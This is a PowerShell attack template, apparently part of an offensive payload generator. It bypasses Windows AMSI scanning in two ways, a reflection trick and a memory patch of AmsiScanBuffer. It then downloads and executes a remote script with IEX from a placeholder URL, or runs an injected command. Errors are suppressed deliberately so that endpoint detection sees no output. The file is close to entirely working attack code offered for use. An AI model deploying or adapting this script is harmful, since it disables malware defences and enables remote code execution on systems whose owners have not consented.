# AMSI Bypass + Command Execution — PowerShell
#
# Technique: Patch AmsiScanBuffer via reflection ([Ref].Assembly.GetType)
#            Then download and execute payload from {{LHOST}}
#
# Usage: powershell -enc <base64-encoded-version>
#        or: powershell -ExecutionPolicy Bypass -File ps_amsi_bypass.ps1
#
# Placeholders replaced at build time:
#   {{PAYLOAD_URL}}  — URL to download and execute (e.g. http://10.0.0.1/payload.ps1)
#   {{COMMAND}}      — alternative: direct command to execute

# ── AMSI Bypass via reflection ──
$amsi = [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils')
$field = $amsi.GetField('amsiInitFailed', 'NonPublic,Static')
$field.SetValue($null, $true)

# ── Alternative: Memory patch (backup method if reflection fails) ──
try {
    $signature = @'
    [DllImport("kernel32")]
    public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
    [DllImport("kernel32")]
    public static extern IntPtr LoadLibrary(string name);
    [DllImport("kernel32")]
    public static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
'@
    $type = Add-Type -MemberDefinition $signature -Name "Win32" -Namespace "Patch" -PassThru
    $hAmsi = $type::LoadLibrary("amsi.dll")
    $addr = $type::GetProcAddress($hAmsi, "AmsiScanBuffer")
    $old = 0
    $type::VirtualProtect($addr, 5, 0x40, [ref]$old)
    # mov rax, rax; ret
    $patch = [Byte[]](0x48, 0x89, 0xC0, 0xC3)
    [System.Runtime.InteropServices.Marshal]::Copy($patch, 0, $addr, 4)
} catch {
    # Reflection fallback already set above
}

# ── Execute payload ──
try {
    # Method 1: Download and execute from URL
    $url = "{{PAYLOAD_URL}}"
    if ($url -ne "{{" + "PAYLOAD_URL}}") {
        IEX (New-Object Net.WebClient).DownloadString($url)
    } else {
        # Method 2: Direct command execution
        $cmd = "{{COMMAND}}"
        if ($cmd -ne "{{" + "COMMAND}}") {
            Invoke-Expression $cmd
        }
    }
} catch {
    # Silent fail — no error output for EDR
}
